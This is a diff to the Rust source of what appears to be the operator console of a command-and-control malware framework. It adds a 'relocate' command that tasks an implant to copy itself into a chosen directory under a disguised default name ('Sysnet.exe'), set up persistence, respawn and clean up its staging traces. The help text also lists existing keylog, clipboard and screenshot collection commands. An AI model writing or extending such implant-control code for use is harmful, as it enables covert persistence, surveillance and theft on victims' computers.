@@ -134,6 +134,9 @@ impl App {
                         .into(),
                 );
                 self.push_log(
+                    "  relocate <id> <dir> <name> [persist] [norespawn]  self-install: copy+persist+respawn+stage cleanup (T040)".into(),
+                );
+                self.push_log(
                     "  collect <id> <screenshot|clipboard|keylog>      collection (T031)".into(),
                 );
                 self.push_log(
@@ -252,6 +255,18 @@ impl App {
                 Some(json!({
                     "cmd": "persist", "session": id, "action": action,
                     "mechanism": mechanism, "name": name, "args": args,
+                }))
+            }
+            Some("relocate") if tokens.len() >= 3 => {
+                // relocate <id> <dir> <name> [persist-mechanism] [respawn]
+                let id: u32 = tokens[1].parse().unwrap_or(0);
+                let dir = tokens[2].to_string();
+                let name = tokens.get(3).copied().unwrap_or("Sysnet.exe").to_string();
+                let persist = tokens.get(4).copied().unwrap_or("").to_string();
+                let respawn = !matches!(tokens.get(5), Some(&"norespawn"));
+                Some(json!({
+                    "cmd": "relocate", "session": id, "dir": dir, "name": name,
+                    "persist": persist, "respawn": respawn,
                 }))
             }
             Some("collect") if tokens.len() >= 3 => {
